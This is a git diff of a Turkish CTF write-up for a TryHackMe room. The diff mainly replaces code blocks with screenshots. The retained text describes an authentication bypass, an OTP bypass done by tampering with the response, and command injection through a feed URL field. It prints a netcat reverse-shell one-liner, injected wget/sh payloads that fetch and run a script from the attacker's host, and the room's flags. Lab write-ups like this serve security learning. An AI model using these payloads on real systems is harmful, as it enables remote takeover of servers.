@@ -60,11 +60,11 @@ Bu not bana iki şey verdi: admin hesabının **e-posta adresi** ve şirketin pa
 
 ## Burp Suite ile Auth Bypass
 
+<img width="752" height="434" alt="request" src="https://github.com/user-attachments/assets/4ba7b1f5-8446-45ab-a63c-9a720ba104de" />
+
 Login sayfasına elimdeki e-posta ile bir istek gönderip Burp Suite ile yakaladım. İsteği incelerken, session/cookie bilgisini isteğin üzerinden silip tekrar gönderdim. Beklenmedik şekilde sunucu şu cevabı döndü:
 
-```json
-{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
-```
+<img width="771" height="400" alt="response" src="https://github.com/user-attachments/assets/a3815cab-55bc-48ae-b281-7c9e2177ad41" />
 
 Yani kimlik doğrulama, cookie olmadan da "başarılı" dönebiliyordu — bu da uygulamanın session kontrolünde ciddi bir mantık hatası olduğunu gösteriyordu. Yönlendirilen `otp.php` sayfasına gittim:
 
@@ -74,22 +74,25 @@ http://10.112.165.37/otp.php
 
 Karşıma **Two Factor Verification** ekranı çıktı, 6 haneli bir kod istiyordu.
 
+<img width="1919" height="573" alt="otpsite" src="https://github.com/user-attachments/assets/8e39e6b3-75f8-4b2a-b44e-347b82d19f10" />
+
 ---
 
 ## OTP Bypass
 
 OTP alanına rastgele bir değer (`111111`) girip isteği yine Burp ile yakaladım. Sunucudan gelen cevap şuydu:
 
-```json
-{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
-```
+<img width="1543" height="396" alt="request2" src="https://github.com/user-attachments/assets/0fc9fea3-8059-4828-ba19-384b186204a2" />
 
 Response içinde `is_verified` diye bir alan dikkatimi çekti. Bu, client tarafına geri dönen ve muhtemelen uygulama mantığında referans alınan bir değerdi. Bu değeri response üzerinde elle `true` yaparak isteği tekrar gönderdim. Birkaç denemeden sonra bu şekilde girişi tamamlamayı başardım ve panele erişim sağladım.
+
+<img width="1518" height="305" alt="request3" src="https://github.com/user-attachments/assets/ea26fdad-fd9c-4298-8962-9e145afc34e8" />
+
+<img width="1919" height="678" alt="firstflag" src="https://github.com/user-attachments/assets/3aa7db7b-97c9-4d23-b026-52c12320f9f0" />
 
 ```
 flag: THM{ADMIN_ACCESS_USING_BURP}
 ```
-
 ---
 
 ## Import Feed - Command Injection ile Shell
@@ -112,6 +115,7 @@ nano shell.sh
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.154.242 4444 >/tmp/f
 ```
+<img width="1108" height="599" alt="shelloluşturma" src="https://github.com/user-attachments/assets/5a906e49-5efe-4379-834a-8ce4e5e77485" />
 
 Sonra bunu hedefin erişebileceği şekilde kendi makinemde servis olarak yayınladım:
 
@@ -124,6 +128,8 @@ Feed URL alanına, sunucunun bu script'i indirmesini sağlayacak bir **command s
 ```
 http://$(wget http://192.168.154.242:8000/shell.sh)
 ```
+<img width="1560" height="697" alt="shellgönderildi" src="https://github.com/user-attachments/assets/40fb62fe-3bb9-4629-b696-a50e3a1a956c" />
+
 
 Sayfa `curl: (3) URL using bad/illegal format or missing URL` hatası döndürse de, bu aslında normaldi — çünkü `$()` içindeki komut zaten çalışmış ve `shell.sh` dosyası hedef sunucuya inmişti. Hata mesajı sadece geri kalan (artık anlamsız) URL'nin curl tarafından reddedilmesinden kaynaklanıyordu.
 
@@ -135,7 +141,7 @@ http://$(sh shell.sh)
 
 Bu istek gönderildiğinde listener tarafında reverse shell'i yakaladım.
 
-*(Ekran görüntüsü buraya: `screenshots/shell-alindi.png`)*
+<img width="1570" height="640" alt="shell alındı" src="https://github.com/user-attachments/assets/eade1ec3-b816-4e14-aa71-ae76b258f022" />
 
 ---
 
@@ -151,22 +157,4 @@ cat /var/www/user.txt
 THM{SYSTEM_PWNED_SUCCESSFULLY}
 ```
 
----
-
-## Özet
-
-| Aşama | Kullanılan Teknik |
-|---|---|
-| Keşif | Nmap full port scan |
-| Dizin Taraması | ffuf ile wildcard response filtreleme, uzantı bazlı fuzzing |
-| Bilgi Sızıntısı | Unutulmuş `login.php.bak` yedek dosyası |
-| Auth Bypass | Burp Suite ile cookie'siz login isteği |
-| 2FA Bypass | Response üzerinde `is_verified` değerinin manipülasyonu |
-| Uzaktan Kod Çalıştırma | "Import Feed" özelliğinde command substitution ile injection |
-| Root/Sistem Erişimi | Reverse shell ile flag dosyasına erişim |
-
-Interceptor, tek bir büyük açıktan çok, arka arkaya zincirlenen küçük hataların (unutulmuş backup dosyası, zayıf session kontrolü, güvenilmeyen client-side response alanı, sanitize edilmemiş URL girdisi) bir araya gelince neye dönüşebileceğini gösteren güzel bir kutuydu.
-
----
-
-*Bu writeup TryHackMe Interceptor odası için hazırlanmıştır.*
+<img width="624" height="502" alt="flag2" src="https://github.com/user-attachments/assets/1ffdf3a1-2cc4-4d83-99b6-189ee25d5598" />
